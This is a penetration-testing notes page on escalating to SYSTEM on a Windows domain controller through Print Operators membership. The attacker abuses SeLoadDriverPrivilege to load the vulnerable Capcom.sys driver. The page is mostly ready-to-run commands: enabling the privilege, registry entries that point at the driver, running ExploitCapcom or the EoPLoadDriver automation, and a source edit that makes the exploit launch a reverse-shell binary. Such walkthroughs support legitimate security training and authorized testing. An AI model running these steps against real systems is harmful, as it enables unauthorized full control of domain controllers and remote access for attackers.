# Print Operators

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**Print Operators**</mark> is another highly privileged group, which grants its members the <mark style="color:green;">`SeLoadDriverPrivilege`</mark>, rights to <mark style="color:purple;">**manage, create, share, and delete printers**</mark> connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.

## <mark style="color:yellow;">Capcom Driver Abuse</mark>

The plan is to use <mark style="color:green;">**EnableSeLoadDriverPrivilege**</mark> script [**\[LINK\]**](https://github.com/3gstudent/Homework-of-C-Language/blob/master/EnableSeLoadDriverPrivilege.cpp) to enable <mark style="color:green;">`SeLoadDriverPrivilege.`</mark> Then we need to load the <mark style="color:green;">**Capcom.sys**</mark> [**\[LINK\]**](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) driver, which was used originally as a anti-cheat for Capcom games, but it also have functionality to allow any user to execute shellcode with <mark style="color:green;">`SYSTEM`</mark> privileges. Then we make a Registry key and edit it for Capcom.sys to be seen. Then we check it with <mark style="color:green;">**DriverView**</mark> [**\[LINK\]**](http://www.nirsoft.net/utils/driverview.html). After we verified that info, we are using <mark style="color:green;">**ExploitCapcom**</mark> script [**\[LINK\]**](https://github.com/tandasat/ExploitCapcom) to get SYSTEM shell.

<mark style="color:orange;">**OR**</mark> we can change code of <mark style="color:green;">**ExploitCapcom**</mark> to make a reverse shell for us (if we have no GUI access).

#### Check privs

```powershell
C:\> whoami /priv
```

#### EnableSeLoadPrivilege

```powershell
C:\> .\EnableSeLoadDriverPrivilege.exe
```

#### Add Reference to Driver

You need to download Capcom.sys to <mark style="color:green;">`C:\temp`</mark>. Issue the commands below to add a reference to this driver under our <mark style="color:blue;">**HKEY\_CURRENT\_USER**</mark> tree.

```powershell
C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\temp\Capcom.sys"

C:\> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

#### Verify Driver

```powershell
PS C:\> .\DriverView.exe /stext drivers.txt

PS C:\> cat drivers.txt | Select-String -pattern Capcom
```

#### Exploiting

```powershell
PS C:\> .\ExploitCapcom.exe
```

***

#### Same stuff but automated

We can use <mark style="color:green;">**EoPLoadDriver**</mark> [**\[LINK\]**](https://github.com/TarlogicSecurity/EoPLoadDriver/) script to automate process of enabling the privilege, creating the registry key, and executing <mark style="color:green;">`NTLoadDriver`</mark> to load the driver by using this command.

```powershell
C:\> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\temp\Capcom.sys
```

```
PS C:\> .\ExploitCapcom.exe
```

***

### NO GUI

For that we need to find ExploitCapcom.cpp. change string below and recompile.

```cpp
B E F O R E : TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");

A F T E R : TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

***

### Cleanup

For a little clean up we could just delete registry key we made before.

```powershell
C:\> reg delete HKCU\System\CurrentControlSet\Capcom
```
